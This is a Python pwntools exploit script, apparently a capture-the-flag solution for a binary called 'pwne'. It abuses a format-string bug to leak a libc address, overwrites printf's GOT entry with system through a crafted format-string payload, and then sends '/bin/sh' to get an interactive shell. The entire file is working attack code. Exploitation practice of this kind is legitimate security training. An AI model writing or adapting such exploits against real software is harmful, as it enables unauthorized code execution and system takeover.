#coding:utf-8
from PwnContext.core import *

context.log_level = 'debug'

def fmt_attack(payload,age):
	p.recvuntil('PLAY[Y/N]\n')
	p.sendline('Y')
	p.recvuntil('NAME:\n\n')
	p.sendline(payload)
	p.recvuntil('WELCOME \n')
	data = p.recvuntil('\n',drop=True)
	p.recvuntil('AGE:\n\n')
	p.sendline(age)
	return data

binary = './pwne'
debug_libc = './libc.so.6'
ctx.binary = binary
ctx.remote_libc = debug_libc
elf = ELF(binary)
libc = ELF(debug_libc)
ctx.debug_remote_libc = True
p = ctx.start()

#leak libc_base
libc_base = int(fmt_attack('%35$p','1'),16) - libc.symbols['__libc_start_main'] - 243
log.success('libc_base addr : 0x%x'%libc_base)
printf_got = elf.got['printf']
system_addr = libc_base + libc.symbols['system']
log.success('system addr : 0x%x'%system_addr)

#hijack printf_got -> system_addr
payload = fmtstr_payload(7,{printf_got:system_addr})
fmt_attack(payload,'1')

#system('/bin/sh\x00')
p.recvuntil('PLAY[Y/N]\n')
p.sendline('Y')
p.recvuntil('NAME:\n\n')
p.sendline('/bin/sh\x00')
p.interactive()